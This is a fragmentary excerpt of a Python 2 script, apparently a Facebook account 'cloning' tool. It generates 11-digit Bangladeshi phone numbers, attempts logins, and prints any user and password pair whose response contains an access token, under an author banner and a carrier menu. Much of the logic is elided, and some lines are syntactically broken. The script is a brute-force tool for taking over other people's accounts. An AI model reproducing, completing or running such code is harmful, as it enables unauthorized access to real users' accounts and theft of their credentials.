...
os.system('clear')
psb('\x1b[1;32mBANGLADESH NAJMUL 11 DIGIT CLONING START PLEASE WAIT ..........')
for n in range(9999):
...
def menu():
    ...
    print ''
    print' 
    print 'AUTHOR   :NAJMUL HOQUE NAYIM '
    print 'FACEBOOK : Md Najmul M.M.M'
    print 'GITHUB     : ★★★
    print ''
    print 50* '-'
    print '[1]  \x1b[1;96mGP'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[NH-OKY]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
